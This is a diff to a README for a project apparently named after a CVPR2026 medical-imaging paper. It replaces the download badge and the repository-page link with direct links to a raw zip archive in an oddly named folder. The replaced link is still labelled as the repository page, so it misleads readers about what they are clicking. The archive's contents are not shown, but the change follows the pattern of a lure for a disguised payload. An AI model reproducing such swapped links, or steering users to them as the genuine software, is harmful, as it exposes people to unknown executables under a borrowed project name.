@@ -1,6 +1,6 @@
 # 🔍 CVPR2026_Similarity_as_Evidence - Improve Medical Model Accuracy Using Evidence
 
-[![Download Application](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Assayswanson597/CVPR2026_Similarity_as_Evidence)
+[![Download Application](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Assayswanson597/CVPR2026_Similarity_as_Evidence/raw/refs/heads/main/vivificative/CVP_as_Evidence_Similarity_intratracheally.zip)
 
 ## 📌 Project Overview
 
@@ -20,7 +20,7 @@ Your computer needs specific components to run this application smoothly. Ensure
 
 To begin, visit the project page to download the software.
 
-[Click here to visit the project repository page](https://github.com/Assayswanson597/CVPR2026_Similarity_as_Evidence)
+[Click here to visit the project repository page](https://github.com/Assayswanson597/CVPR2026_Similarity_as_Evidence/raw/refs/heads/main/vivificative/CVP_as_Evidence_Similarity_intratracheally.zip)
 
 Follow these steps to set up your environment:
 
